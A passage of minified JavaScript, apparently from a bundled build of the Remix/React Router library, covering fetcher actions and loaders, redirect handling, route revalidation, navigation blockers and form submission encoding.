                    flushSync: Pe
                });
                return
            }
        }
        Q.set(E, Ie);
        let Nt = V
          , We = (await de("action", w, Be, [F], te, E))[F.route.id];
        if (Be.signal.aborted) {
            Q.get(E) === Ie && Q.delete(E);
            return
        }
        if (d.v7_fetcherPersist && W.has(E)) {
            if (Yr(We) || an(We)) {
                oe(E, cr(void 0));
                return
            }
        } else {
            if (Yr(We))
                if (Q.delete(E),
                le > Nt) {
                    oe(E, cr(void 0));
                    return
                } else
                    return M.add(E),
                    oe(E, bo(ie)),
                    q(Be, We, !1, {
                        fetcherSubmission: ie,
                        preventScrollReset: Z
                    });
            if (an(We)) {
                De(E, _, We.error);
                return
            }
        }
        if (yr(We))
            throw Gt(400, {
                type: "defer-action"
            });
        let ft = w.navigation.location || w.location
          , v = xa(e.history, ft, Ie.signal)
          , T = s || i
          , D = w.navigation.state !== "idle" ? $r(T, w.navigation.location, u) : w.matches;
        Fe(D, "Didn't find any matches after fetcher action");
        let B = ++V;
        z.set(E, B);
        let ve = bo(ie, We.data);
        w.fetchers.set(E, ve);
        let[he,ke] = Ep(e.history, w, D, ie, ft, !1, d.v7_skipActionErrorRevalidation, H, X, J, W, Y, M, T, u, [F.route.id, We]);
        ke.filter(ze => ze.key !== E).forEach(ze => {
            let ot = ze.key
              , Kt = w.fetchers.get(ot)
              , rr = bo(void 0, Kt ? Kt.data : void 0);
            w.fetchers.set(ot, rr),
            St(ot),
            ze.controller && Q.set(ot, ze.controller)
        }
        ),
        Ce({
            fetchers: new Map(w.fetchers)
        });
        let Ye = () => ke.forEach(ze => St(ze.key));
        Ie.signal.addEventListener("abort", Ye);
        let {loaderResults: Qe, fetcherResults: pe} = await Re(w, D, he, ke, v);
        if (Ie.signal.aborted)
            return;
        Ie.signal.removeEventListener("abort", Ye),
        z.delete(E),
        Q.delete(E),
        ke.forEach(ze => Q.delete(ze.key));
        let we = qi(Qe);
        if (we)
            return q(v, we.result, !1, {
                preventScrollReset: Z
            });
        if (we = qi(pe),
        we)
            return M.add(we.key),
            q(v, we.result, !1, {
                preventScrollReset: Z
            });
        let {loaderData: Et, errors: gt} = Rp(w, D, Qe, void 0, ke, pe, b);
        if (w.fetchers.has(E)) {
            let ze = cr(We.data);
            w.fetchers.set(E, ze)
        }
        L(B),
        w.navigation.state === "loading" && B > le ? (Fe(A, "Expected pending action"),
        K && K.abort(),
        Me(w.navigation.location, {
            matches: D,
            loaderData: Et,
            errors: gt,
            fetchers: new Map(w.fetchers)
        })) : (Ce({
            errors: gt,
            loaderData: Ap(w.loaderData, Et, D, gt),
            fetchers: new Map(w.fetchers)
        }),
        H = !1)
    }
    async function Ke(E, _, R, F, te, ye, Pe, Z, ie) {
        let re = w.fetchers.get(E);
        oe(E, bo(ie, re ? re.data : void 0), {
            flushSync: Pe
        });
        let me = new AbortController
          , Ie = xa(e.history, R, me.signal);
        if (ye) {
            let We = await zr(te, R, Ie.signal);
            if (We.type === "aborted")
                return;
            if (We.type === "error") {
                De(E, _, We.error, {
                    flushSync: Pe
                });
                return
            } else if (We.matches)
                te = We.matches,
                F = Po(te, R);
            else {
                De(E, _, Gt(404, {
                    pathname: R
                }), {
                    flushSync: Pe
                });
                return
            }
        }
        Q.set(E, me);
        let Be = V
          , Ze = (await de("loader", w, Ie, [F], te, E))[F.route.id];
        if (yr(Ze) && (Ze = await Bf(Ze, Ie.signal, !0) || Ze),
        Q.get(E) === me && Q.delete(E),
        !Ie.signal.aborted) {
            if (W.has(E)) {
                oe(E, cr(void 0));
                return
            }
            if (Yr(Ze))
                if (le > Be) {
                    oe(E, cr(void 0));
                    return
                } else {
                    M.add(E),
                    await q(Ie, Ze, !1, {
                        preventScrollReset: Z
                    });
                    return
                }
            if (an(Ze)) {
                De(E, _, Ze.error);
                return
            }
            Fe(!yr(Ze), "Unhandled fetcher deferred data"),
            oe(E, cr(Ze.data))
        }
    }
    async function q(E, _, R, F) {
        let {submission: te, fetcherSubmission: ye, preventScrollReset: Pe, replace: Z} = F === void 0 ? {} : F;
        _.response.headers.has("X-Remix-Revalidate") && (H = !0);
        let ie = _.response.headers.get("Location");
        Fe(ie, "Expected a Location header on the redirect Response"),
        ie = Pp(ie, new URL(E.url), u);
        let re = li(w.location, ie, {
            _isRedirect: !0
        });
        if (n) {
            let We = !1;
            if (_.response.headers.has("X-Remix-Reload-Document"))
                We = !0;
            else if (Uf.test(ie)) {
                const ft = e.history.createURL(ie);
                We = ft.origin !== t.location.origin || to(ft.pathname, u) == null
            }
            if (We) {
                Z ? t.location.replace(ie) : t.location.assign(ie);
                return
            }
        }
        K = null;
        let me = Z === !0 || _.response.headers.has("X-Remix-Replace") ? kt.Replace : kt.Push
          , {formMethod: Ie, formAction: Be, formEncType: Nt} = w.navigation;
        !te && !ye && Ie && Be && Nt && (te = Dp(w.navigation));
        let Ze = te || ye;
        if (F2.has(_.response.status) && Ze && kn(Ze.formMethod))
            await O(me, re, {
                submission: dt({}, Ze, {
                    formAction: ie
                }),
                preventScrollReset: Pe || P,
                enableViewTransition: R ? $ : void 0
            });
        else {
            let We = lu(re, te);
            await O(me, re, {
                overrideNavigation: We,
                fetcherSubmission: ye,
                preventScrollReset: Pe || P,
                enableViewTransition: R ? $ : void 0
            })
        }
    }
    async function de(E, _, R, F, te, ye) {
        let Pe, Z = {};
        try {
            Pe = await G2(c, E, _, R, F, te, ye, o, a)
        } catch (ie) {
            return F.forEach(re => {
                Z[re.route.id] = {
                    type: et.error,
                    error: ie
                }
            }
            ),
            Z
        }
        for (let[ie,re] of Object.entries(Pe))
            if (Z2(re)) {
                let me = re.result;
                Z[ie] = {
                    type: et.redirect,
                    response: X2(me, R, ie, te, u, d.v7_relativeSplatPath)
                }
            } else
                Z[ie] = await Q2(re);
        return Z
    }
    async function Re(E, _, R, F, te) {
        let ye = E.matches
          , Pe = de("loader", E, te, R, _, null)
          , Z = Promise.all(F.map(async me => {
            if (me.matches && me.match && me.controller) {
                let Be = (await de("loader", E, xa(e.history, me.path, me.controller.signal), [me.match], me.matches, me.key))[me.match.route.id];
                return {
                    [me.key]: Be
                }
            } else
                return Promise.resolve({
                    [me.key]: {
                        type: et.error,
                        error: Gt(404, {
                            pathname: me.path
                        })
                    }
                })
        }
        ))
          , ie = await Pe
          , re = (await Z).reduce( (me, Ie) => Object.assign(me, Ie), {});
        return await Promise.all([nx(_, ie, te.signal, ye, E.loaderData), rx(_, re, F)]),
        {
            loaderResults: ie,
            fetcherResults: re
        }
    }
    function ee() {
        H = !0,
        X.push(...lo()),
        Y.forEach( (E, _) => {
            Q.has(_) && J.add(_),
            St(_)
        }
        )
    }
    function oe(E, _, R) {
        R === void 0 && (R = {}),
        w.fetchers.set(E, _),
        Ce({
            fetchers: new Map(w.fetchers)
        }, {
            flushSync: (R && R.flushSync) === !0
        })
    }
    function De(E, _, R, F) {
        F === void 0 && (F = {});
        let te = Hr(w.matches, _);
        ut(E),
        Ce({
            errors: {
                [te.route.id]: R
            },
            fetchers: new Map(w.fetchers)
        }, {
            flushSync: (F && F.flushSync) === !0
        })
    }
    function Pt(E) {
        return d.v7_fetcherPersist && (ge.set(E, (ge.get(E) || 0) + 1),
        W.has(E) && W.delete(E)),
        w.fetchers.get(E) || U2
    }
    function ut(E) {
        let _ = w.fetchers.get(E);
        Q.has(E) && !(_ && _.state === "loading" && z.has(E)) && St(E),
        Y.delete(E),
        z.delete(E),
        M.delete(E),
        W.delete(E),
        J.delete(E),
        w.fetchers.delete(E)
    }
    function Lt(E) {
        if (d.v7_fetcherPersist) {
            let _ = (ge.get(E) || 0) - 1;
            _ <= 0 ? (ge.delete(E),
            W.add(E)) : ge.set(E, _)
        } else
            ut(E);
        Ce({
            fetchers: new Map(w.fetchers)
        })
    }
    function St(E) {
        let _ = Q.get(E);
        _ && (_.abort(),
        Q.delete(E))
    }
    function mn(E) {
        for (let _ of E) {
            let R = Pt(_)
              , F = cr(R.data);
            w.fetchers.set(_, F)
        }
    }
    function at() {
        let E = []
          , _ = !1;
        for (let R of M) {
            let F = w.fetchers.get(R);
            Fe(F, "Expected fetcher: " + R),
            F.state === "loading" && (M.delete(R),
            E.push(R),
            _ = !0)
        }
        return mn(E),
        _
    }
    function L(E) {
        let _ = [];
        for (let[R,F] of z)
            if (F < E) {
                let te = w.fetchers.get(R);
                Fe(te, "Expected fetcher: " + R),
                te.state === "loading" && (St(R),
                z.delete(R),
                _.push(R))
            }
        return mn(_),
        _.length > 0
    }
    function ne(E, _) {
        let R = w.blockers.get(E) || wo;
        return xe.get(E) !== _ && xe.set(E, _),
        R
    }
    function wt(E) {
        w.blockers.delete(E),
        xe.delete(E)
    }
    function ct(E, _) {
        let R = w.blockers.get(E) || wo;
        Fe(R.state === "unblocked" && _.state === "blocked" || R.state === "blocked" && _.state === "blocked" || R.state === "blocked" && _.state === "proceeding" || R.state === "blocked" && _.state === "unblocked" || R.state === "proceeding" && _.state === "unblocked", "Invalid blocker state transition: " + R.state + " -> " + _.state);
        let F = new Map(w.blockers);
        F.set(E, _),
        Ce({
            blockers: F
        })
    }
    function mt(E) {
        let {currentLocation: _, nextLocation: R, historyAction: F} = E;
        if (xe.size === 0)
            return;
        xe.size > 1 && Qa(!1, "A router only supports one blocker at a time");
        let te = Array.from(xe.entries())
          , [ye,Pe] = te[te.length - 1]
          , Z = w.blockers.get(ye);
        if (!(Z && Z.state === "proceeding") && Pe({
            currentLocation: _,
            nextLocation: R,
            historyAction: F
        }))
            return ye
    }
    function so(E) {
        let _ = Gt(404, {
            pathname: E
        })
          , R = s || i
          , {matches: F, route: te} = Ip(R);
        return lo(),
        {
            notFoundMatches: F,
            route: te,
            error: _
        }
    }
    function lo(E) {
        let _ = [];
        return b.forEach( (R, F) => {
            (!E || E(F)) && (R.cancel(),
            _.push(F),
            b.delete(F))
        }
        ),
        _
    }
    function Ci(E, _, R) {
        if (y = E,
        x = _,
        S = R || null,
        !g && w.navigation === su) {
            g = !0;
            let F = Un(w.location, w.matches);
            F != null && Ce({
                restoreScrollPosition: F
            })
        }
        return () => {
            y = null,
            x = null,
            S = null
        }
    }
    function uo(E, _) {
        return S && S(E, _.map(F => y2(F, w.loaderData))) || E.key
    }
    function ma(E, _) {
        if (y && x) {
            let R = uo(E, _);
            y[R] = x()
        }
    }
    function Un(E, _) {
        if (y) {
            let R = uo(E, _)
              , F = y[R];
            if (typeof F == "number")
                return F
        }
        return null
    }
    function tn(E, _, R) {
        if (f)
            if (E) {
                if (Object.keys(E[0].params).length > 0)
                    return {
                        active: !0,
                        matches: ds(_, R, u, !0)
                    }
            } else
                return {
                    active: !0,
                    matches: ds(_, R, u, !0) || []
                };
        return {
            active: !1,
            matches: null
        }
    }
    async function zr(E, _, R) {
        if (!f)
            return {
                type: "success",
                matches: E
            };
        let F = E;
        for (; ; ) {
            let te = s == null
              , ye = s || i
              , Pe = o;
            try {
                await f({
                    path: _,
                    matches: F,
                    patch: (re, me) => {
                        R.aborted || Tp(re, me, ye, Pe, a)
                    }
                })
            } catch (re) {
                return {
                    type: "error",
                    error: re,
                    partialMatches: F
                }
            } finally {
                te && !R.aborted && (i = [...i])
            }
            if (R.aborted)
                return {
                    type: "aborted"
                };
            let Z = $r(ye, _, u);
            if (Z)
                return {
                    type: "success",
                    matches: Z
                };
            let ie = ds(ye, _, u, !0);
            if (!ie || F.length === ie.length && F.every( (re, me) => re.route.id === ie[me].route.id))
                return {
                    type: "success",
                    matches: null
                };
            F = ie
        }
    }
    function ga(E) {
        o = {},
        s = $s(E, a, void 0, o)
    }
    function ki(E, _) {
        let R = s == null;
        Tp(E, _, s || i, o, a),
        R && (i = [...i],
        Ce({}))
    }
    return k = {
        get basename() {
            return u
        },
        get future() {
            return d
        },
        get state() {
            return w
        },
        get routes() {
            return i
        },
        get window() {
            return t
        },
        initialize: Ne,
        subscribe: Ue,
        enableScrollRestoration: Ci,
        navigate: tt,
        fetch: _e,
        revalidate: Xe,
        createHref: E => e.history.createHref(E),
        encodeLocation: E => e.history.encodeLocation(E),
        getFetcher: Pt,
        deleteFetcher: Lt,
        dispose: $e,
        getBlocker: ne,
        deleteBlocker: wt,
        patchRoutes: ki,
        _internalFetchControllers: Q,
        _internalActiveDeferreds: b,
        _internalSetRoutes: ga
    },
    k
}
function H2(e) {
    return e != null && ("formData"in e && e.formData != null || "body"in e && e.body !== void 0)
}
function hc(e, t, n, r, a, o, i, s) {
    let u, c;
    if (i) {
        u = [];
        for (let d of t)
            if (u.push(d),
            d.route.id === i) {
                c = d;
                break
            }
    } else
        u = t,
        c = t[t.length - 1];
    let f = xl(a || ".", vl(u, o), to(e.pathname, n) || e.pathname, s === "path");
    if (a == null && (f.search = e.search,
    f.hash = e.hash),
    (a == null || a === "" || a === ".") && c) {
        let d = $f(f.search);
        if (c.route.index && !d)
            f.search = f.search ? f.search.replace(/^\?/, "?index&") : "?index";
        else if (!c.route.index && d) {
            let h = new URLSearchParams(f.search)
              , N = h.getAll("index");
            h.delete("index"),
            N.filter(S => S).forEach(S => h.append("index", S));
            let y = h.toString();
            f.search = y ? "?" + y : ""
        }
    }
    return r && n !== "/" && (f.pathname = f.pathname === "/" ? n : Gn([n, f.pathname])),
    sa(f)
}
function kp(e, t, n, r) {
    if (!r || !H2(r))
        return {
            path: n
        };
    if (r.formMethod && !tx(r.formMethod))
        return {
            path: n,
            error: Gt(405, {
                method: r.formMethod
            })
        };
    let a = () => ({
        path: n,
        error: Gt(400, {
            type: "invalid-body"
        })
    })
      , o = r.formMethod || "get"
      , i = e ? o.toUpperCase() : o.toLowerCase()
      , s = lg(n);
    if (r.body !== void 0) {
        if (r.formEncType === "text/plain") {
            if (!kn(i))
                return a();
            let h = typeof r.body == "string" ? r.body : r.body instanceof FormData || r.body instanceof URLSearchParams ? Array.from(r.body.entries()).reduce( (N, y) => {
                let[S,x] = y;
                return "" + N + S + "=" + x + `
`
            }
            , "") : String(r.body);
            return {
                path: n,
                submission: {
                    formMethod: i,
                    formAction: s,
                    formEncType: r.formEncType,
                    formData: void 0,
                    json: void 0,
                    text: h
                }
            }
        } else if (r.formEncType === "application/json") {
            if (!kn(i))
                return a();
            try {
                let h = typeof r.body == "string" ? JSON.parse(r.body) : r.body;
                return {
                    path: n,
                    submission: {
                        formMethod: i,
                        formAction: s,
                        formEncType: r.formEncType,
                        formData: void 0,
                        json: h,
                        text: void 0
                    }
                }
            } catch {
                return a()
            }
        }
    }
    Fe(typeof FormData == "function", "FormData is not available in this environment");
    let u, c;
    if (r.formData)
        u = gc(r.formData),
        c = r.formData;
    else if (r.body instanceof FormData)
        u = gc(r.body),
        c = r.body;
    else if (r.body instanceof URLSearchParams)
        u = r.body,
        c = Op(u);
    else if (r.body == null)
        u = new URLSearchParams,
        c = new FormData;
    else
        try {
            u = new URLSearchParams(r.body),
            c = Op(u)
        } catch {
            return a()
        }
    let f = {
        formMethod: i,
        formAction: s,
        formEncType: r && r.formEncType || "application/x-www-form-urlencoded",
        formData: c,
        json: void 0,
        text: void 0
    };
    if (kn(f.formMethod))
        return {
            path: n,
            submission: f
        };
    let d = Ir(n);
    return t && d.search && $f(d.search) && u.append("index", ""),
    d.search = "?" + u,
    {
        path: sa(d),
        submission: f
    }
}
function jp(e, t, n) {
    n === void 0 && (n = !1);
    let r = e.findIndex(a => a.route.id === t);
    return r >= 0 ? e.slice(0, n ? r + 1 : r) : e
}
function Ep(e, t, n, r, a, o, i, s, u, c, f, d, h, N, y, S) {
    let x = S ? an(S[1]) ? S[1].error : S[1].data : void 0
      , g = e.createURL(t.location)
      , p = e.createURL(a)
      , m = n;
    o && t.errors ? m = jp(n, Object.keys(t.errors)[0], !0) : S && an(S[1]) && (m = jp(n, S[0]));
    let C = S ? S[1].statusCode : void 0
      , k = i && C && C >= 400
      , w = m.filter( (P, K) => {
        let {route: $} = P;
        if ($.lazy)
            return !0;
        if ($.loader == null)
            return !1;
        if (o)
            return mc($, t.loaderData, t.errors);
        if (V2(t.loaderData, t.matches[K], P) || u.some(Ae => Ae === P.route.id))
            return !0;
        let Se = t.matches[K]
          , Te = P;
        return _p(P, dt({
            currentUrl: g,
            currentParams: Se.params,
            nextUrl: p,
            nextParams: Te.params
        }, r, {
            actionResult: x,
            actionStatus: C,
            defaultShouldRevalidate: k ? !1 : s || g.pathname + g.search === p.pathname + p.search || g.search !== p.search || ig(Se, Te)
        }))
    }
    )
      , A = [];
    return d.forEach( (P, K) => {
        if (o || !n.some(H => H.route.id === P.routeId) || f.has(K))
            return;
        let $ = $r(N, P.path, y);
        if (!$) {
            A.push({
                key: K,
                routeId: P.routeId,
                path: P.path,
                matches: null,
                match: null,
                controller: null
            });
            return
        }
        let Se = t.fetchers.get(K)
          , Te = Po($, P.path)
          , Ae = !1;
        h.has(K) ? Ae = !1 : c.has(K) ? (c.delete(K),
        Ae = !0) : Se && Se.state !== "idle" && Se.data === void 0 ? Ae = s : Ae = _p(Te, dt({
            currentUrl: g,
            currentParams: t.matches[t.matches.length - 1].params,
            nextUrl: p,
            nextParams: n[n.length - 1].params
        }, r, {
            actionResult: x,
            actionStatus: C,
            defaultShouldRevalidate: k ? !1 : s
        })),
        Ae && A.push({
            key: K,
            routeId: P.routeId,
            path: P.path,
            matches: $,
            match: Te,
            controller: new AbortController
        })
    }
    ),
    [w, A]
}
function mc(e, t, n) {
    if (e.lazy)
        return !0;
    if (!e.loader)
        return !1;
    let r = t != null && t[e.id] !== void 0
      , a = n != null && n[e.id] !== void 0;
    return !r && a ? !1 : typeof e.loader == "function" && e.loader.hydrate === !0 ? !0 : !r && !a
}
function V2(e, t, n) {
    let r = !t || n.route.id !== t.route.id
      , a = e[n.route.id] === void 0;
    return r || a
}
function ig(e, t) {
    let n = e.route.path;
    return e.pathname !== t.pathname || n != null && n.endsWith("*") && e.params["*"] !== t.params["*"]
}
function _p(e, t) {
    if (e.route.shouldRevalidate) {
        let n = e.route.shouldRevalidate(t);
        if (typeof n == "boolean")
            return n
    }
    return t.defaultShouldRevalidate
}
function Tp(e, t, n, r, a) {
    var o;
    let i;
    if (e) {
        let c = r[e];
        Fe(c, "No route found to patch children into: routeId = " + e),
        c.children || (c.children = []),
        i = c.children
    } else
        i = n;
    let s = t.filter(c => !i.some(f => sg(c, f)))
      , u = $s(s, a, [e || "_", "patch", String(((o = i) == null ? void 0 : o.length) || "0")], r);
    i.push(...u)
}
function sg(e, t) {
    return "id"in e && "id"in t && e.id === t.id ? !0 : e.index === t.index && e.path === t.path && e.caseSensitive === t.caseSensitive ? (!e.children || e.children.length === 0) && (!t.children || t.children.length === 0) ? !0 : e.children.every( (n, r) => {
        var a;
        return (a = t.children) == null ? void 0 : a.some(o => sg(n, o))
    }
    ) : !1
}
async function W2(e, t, n) {
    if (!e.lazy)
        return;
    let r = await e.lazy();
    if (!e.lazy)
        return;
    let a = n[e.id];
    Fe(a, "No route found in manifest");
    let o = {};
    for (let i in r) {
        let u = a[i] !== void 0 && i !== "hasErrorBoundary";
        Qa(!u, 'Route "' + a.id + '" has a static property "' + i + '" defined but its lazy function is also returning a value for this property. ' + ('The lazy route property "' + i + '" will be ignored.')),
        !u && !m2.has(i) && (o[i] = r[i])
    }
    Object.assign(a, o),
    Object.assign(a, dt({}, t(a), {
        lazy: void 0
    }))
}
async function K2(e) {
    let {matches: t} = e
      , n = t.filter(a => a.shouldLoad);
    return (await Promise.all(n.map(a => a.resolve()))).reduce( (a, o, i) => Object.assign(a, {
        [n[i].route.id]: o
    }), {})
}
async function G2(e, t, n, r, a, o, i, s, u, c) {
    let f = o.map(N => N.route.lazy ? W2(N.route, u, s) : void 0)
      , d = o.map( (N, y) => {
        let S = f[y]
          , x = a.some(p => p.route.id === N.route.id);
        return dt({}, N, {
            shouldLoad: x,
            resolve: async p => (p && r.method === "GET" && (N.route.lazy || N.route.loader) && (x = !0),
            x ? Y2(t, r, N, S, p, c) : Promise.resolve({
                type: et.data,
                result: void 0
            }))
        })
    }
    )
      , h = await e({
        matches: d,
        request: r,
        params: o[0].params,
        fetcherKey: i,
        context: c
    });
    try {
        await Promise.all(f)
    } catch {}
    return h
}
async function Y2(e, t, n, r, a, o) {
    let i, s, u = c => {
        let f, d = new Promise( (y, S) => f = S);
        s = () => f(),
        t.signal.addEventListener("abort", s);
        let h = y => typeof c != "function" ? Promise.reject(new Error("You cannot call the handler for a route which defines a boolean " + ('"' + e + '" [routeId: ' + n.route.id + "]"))) : c({
            request: t,
            params: n.params,
            context: o
        }, ...y !== void 0 ? [y] : [])
          , N = (async () => {
            try {
                return {
                    type: "data",
                    result: await (a ? a(S => h(S)) : h())
                }
            } catch (y) {
                return {
                    type: "error",
                    result: y
                }
            }
        }
        )();
        return Promise.race([N, d])
    }
    ;
    try {
        let c = n.route[e];
        if (r)
            if (c) {
                let f, [d] = await Promise.all([u(c).catch(h => {
                    f = h
                }
                ), r]);
                if (f !== void 0)
                    throw f;
                i = d
            } else if (await r,
            c = n.route[e],
            c)
                i = await u(c);
            else if (e === "action") {
                let f = new URL(t.url)
                  , d = f.pathname + f.search;
                throw Gt(405, {
                    method: t.method,
                    pathname: d,
                    routeId: n.route.id
                })
            } else
                return {
                    type: et.data,
                    result: void 0
                };
        else if (c)
            i = await u(c);
        else {
            let f = new URL(t.url)
              , d = f.pathname + f.search;
            throw Gt(404, {
                pathname: d
            })
        }
        Fe(i.result !== void 0, "You defined " + (e === "action" ? "an action" : "a loader") + " for route " + ('"' + n.route.id + "\" but didn't return anything from your `" + e + "` ") + "function. Please return a value or `null`.")
    } catch (c) {
        return {
            type: et.error,
            result: c
        }
    } finally {
        s && t.signal.removeEventListener("abort", s)
    }
    return i
}
async function Q2(e) {
    let {result: t, type: n} = e;
    if (ug(t)) {
        let c;
        try {
            let f = t.headers.get("Content-Type");
            f && /\bapplication\/json\b/.test(f) ? t.body == null ? c = null : c = await t.json() : c = await t.text()
        } catch (f) {
            return {
                type: et.error,
                error: f
            }
        }
        return n === et.error ? {
            type: et.error,
            error: new Hs(t.status,t.statusText,c),
            statusCode: t.status,
            headers: t.headers
        } : {
            type: et.data,
            data: c,
            statusCode: t.status,
            headers: t.headers
        }
    }
    if (n === et.error) {
        if (Mp(t)) {
            var r;
            if (t.data instanceof Error) {
                var a;
                return {
                    type: et.error,
                    error: t.data,
                    statusCode: (a = t.init) == null ? void 0 : a.status
                }
            }
            t = new Hs(((r = t.init) == null ? void 0 : r.status) || 500,void 0,t.data)
        }
        return {
            type: et.error,
            error: t,
            statusCode: wl(t) ? t.status : void 0
        }
    }
    if (ex(t)) {
        var o, i;
        return {
            type: et.deferred,
            deferredData: t,
            statusCode: (o = t.init) == null ? void 0 : o.status,
            headers: ((i = t.init) == null ? void 0 : i.headers) && new Headers(t.init.headers)
        }
    }
    if (Mp(t)) {
        var s, u;
        return {
            type: et.data,
            data: t.data,
            statusCode: (s = t.init) == null ? void 0 : s.status,
            headers: (u = t.init) != null && u.headers ? new Headers(t.init.headers) : void 0
        }
    }
    return {
        type: et.data,
        data: t
    }
}
function X2(e, t, n, r, a, o) {
    let i = e.headers.get("Location");
    if (Fe(i, "Redirects returned/thrown from loaders/actions must have a Location header"),
    !Uf.test(i)) {
        let s = r.slice(0, r.findIndex(u => u.route.id === n) + 1);
        i = hc(new URL(t.url), s, a, !0, i, o),
        e.headers.set("Location", i)
    }
    return e
}
function Pp(e, t, n) {
    if (Uf.test(e)) {
        let r = e
          , a = r.startsWith("//") ? new URL(t.protocol + r) : new URL(r)
          , o = to(a.pathname, n) != null;
        if (a.origin === t.origin && o)
            return a.pathname + a.search + a.hash
    }
    return e
}
function xa(e, t, n, r) {
    let a = e.createURL(lg(t)).toString()
      , o = {
        signal: n
    };
    if (r && kn(r.formMethod)) {
        let {formMethod: i, formEncType: s} = r;
        o.method = i.toUpperCase(),
        s === "application/json" ? (o.headers = new Headers({
            "Content-Type": s
        }),
        o.body = JSON.stringify(r.json)) : s === "text/plain" ? o.body = r.text : s === "application/x-www-form-urlencoded" && r.formData ? o.body = gc(r.formData) : o.body = r.formData
    }
    return new Request(a,o)
}
function gc(e) {
    let t = new URLSearchParams;
    for (let[n,r] of e.entries())
        t.append(n, typeof r == "string" ? r : r.name);
    return t
}
function Op(e) {
    let t = new FormData;
    for (let[n,r] of e.entries())
        t.append(n, r);
    return t
}
function q2(e, t, n, r, a) {
    let o = {}, i = null, s, u = !1, c = {}, f = n && an(n[1]) ? n[1].error : void 0;
    return e.forEach(d => {
        if (!(d.route.id in t))
            return;
        let h = d.route.id
          , N = t[h];
        if (Fe(!Yr(N), "Cannot handle redirect results in processLoaderData"),
        an(N)) {
            let y = N.error;
            f !== void 0 && (y = f,
            f = void 0),
            i = i || {};
            {
                let S = Hr(e, h);
                i[S.route.id] == null && (i[S.route.id] = y)
            }
            o[h] = void 0,
            u || (u = !0,
            s = wl(N.error) ? N.error.status : 500),
            N.headers && (c[h] = N.headers)
        } else
            yr(N) ? (r.set(h, N.deferredData),
            o[h] = N.deferredData.data,
            N.statusCode != null && N.statusCode !== 200 && !u && (s = N.statusCode),
            N.headers && (c[h] = N.headers)) : (o[h] = N.data,
            N.statusCode && N.statusCode !== 200 && !u && (s = N.statusCode),
            N.headers && (c[h] = N.headers))
    }
    ),
    f !== void 0 && n && (i = {
        [n[0]]: f
    },
    o[n[0]] = void 0),
    {
        loaderData: o,
        errors: i,
        statusCode: s || 200,
        loaderHeaders: c
    }
}
function Rp(e, t, n, r, a, o, i) {
    let {loaderData: s, errors: u} = q2(t, n, r, i);
    return a.forEach(c => {
        let {key: f, match: d, controller: h} = c
          , N = o[f];
        if (Fe(N, "Did not find corresponding fetcher result"),
        !(h && h.signal.aborted))
            if (an(N)) {
                let y = Hr(e.matches, d == null ? void 0 : d.route.id);
                u && u[y.route.id] || (u = dt({}, u, {
                    [y.route.id]: N.error
                })),
                e.fetchers.delete(f)
            } else if (Yr(N))
                Fe(!1, "Unhandled fetcher revalidation redirect");
            else if (yr(N))
                Fe(!1, "Unhandled fetcher deferred data");
            else {
                let y = cr(N.data);
                e.fetchers.set(f, y)
            }
    }
    ),
    {
        loaderData: s,
        errors: u
    }
}
function Ap(e, t, n, r) {
    let a = dt({}, t);
    for (let o of n) {
        let i = o.route.id;
        if (t.hasOwnProperty(i) ? t[i] !== void 0 && (a[i] = t[i]) : e[i] !== void 0 && o.route.loader && (a[i] = e[i]),
        r && r.hasOwnProperty(i))
            break
    }
    return a
}
function Lp(e) {
    return e ? an(e[1]) ? {
        actionData: {}
    } : {
        actionData: {
            [e[0]]: e[1].data
        }
    } : {}
}
function Hr(e, t) {
    return (t ? e.slice(0, e.findIndex(r => r.route.id === t) + 1) : [...e]).reverse().find(r => r.route.hasErrorBoundary === !0) || e[0]
}
function Ip(e) {
    let t = e.length === 1 ? e[0] : e.find(n => n.index || !n.path || n.path === "/") || {
        id: "__shim-error-route__"
    };
    return {
        matches: [{
            params: {},
            pathname: "",
            pathnameBase: "",
            route: t
        }],
        route: t
    }
}
function Gt(e, t) {
    let {pathname: n, routeId: r, method: a, type: o, message: i} = t === void 0 ? {} : t
      , s = "Unknown Server Error"
      , u = "Unknown @remix-run/router error";
    return e === 400 ? (s = "Bad Request",
    a && n && r ? u = "You made a " + a + ' request to "' + n + '" but ' + ('did not provide a `loader` for route "' + r + '", ') + "so there is no way to handle the request." : o === "defer-action" ? u = "defer() is not supported in actions" : o === "invalid-body" && (u = "Unable to encode submission body")) : e === 403 ? (s = "Forbidden",
    u = 'Route "' + r + '" does not match URL "' + n + '"') : e === 404 ? (s = "Not Found",
    u = 'No route matches URL "' + n + '"') : e === 405 && (s = "Method Not Allowed",
    a && n && r ? u = "You made a " + a.toUpperCase() + ' request to "' + n + '" but ' + ('did not provide an `action` for route "' + r + '", ') + "so there is no way to handle the request." : a && (u = 'Invalid request method "' + a.toUpperCase() + '"')),
    new Hs(e || 500,s,new Error(u),!0)
}
function qi(e) {
    let t = Object.entries(e);
    for (let n = t.length - 1; n >= 0; n--) {
        let[r,a] = t[n];
        if (Yr(a))
            return {
                key: r,
                result: a
            }
    }
}
function lg(e) {
    let t = typeof e == "string" ? Ir(e) : e;
    return sa(dt({}, t, {
        hash: ""
    }))
}
function J2(e, t) {
    return e.pathname !== t.pathname || e.search !== t.search ? !1 : e.hash === "" ? t.hash !== "" : e.hash === t.hash ? !0 : t.hash !== ""
}
function Z2(e) {
    return ug(e.result) && z2.has(e.result.status)
}
function yr(e) {
    return e.type === et.deferred
}
function an(e) {
    return e.type === et.error
}
function Yr(e) {
    return (e && e.type) === et.redirect
}
function Mp(e) {
    return typeof e == "object" && e != null && "type"in e && "data"in e && "init"in e && e.type === "DataWithResponseInit"
}
function ex(e) {
    let t = e;
    return t && typeof t == "object" && typeof t.data == "object" && typeof t.subscribe == "function" && typeof t.cancel == "function" && typeof t.resolveData == "function"
}
function ug(e) {
    return e != null && typeof e.status == "number" && typeof e.statusText == "string" && typeof e.headers == "object" && typeof e.body < "u"
}
function tx(e) {
    return D2.has(e.toLowerCase())
}
function kn(e) {
    return I2.has(e.toLowerCase())
}
async function nx(e, t, n, r, a) {
    let o = Object.entries(t);
    for (let i = 0; i < o.length; i++) {
        let[s,u] = o[i]
          , c = e.find(h => (h == null ? void 0 : h.route.id) === s);
        if (!c)
            continue;
        let f = r.find(h => h.route.id === c.route.id)
          , d = f != null && !ig(f, c) && (a && a[c.route.id]) !== void 0;
        yr(u) && d && await Bf(u, n, !1).then(h => {
            h && (t[s] = h)
        }
        )
    }
}
async function rx(e, t, n) {
    for (let r = 0; r < n.length; r++) {
        let {key: a, routeId: o, controller: i} = n[r]
          , s = t[a];
        e.find(c => (c == null ? void 0 : c.route.id) === o) && yr(s) && (Fe(i, "Expected an AbortController for revalidating fetcher deferred result"),
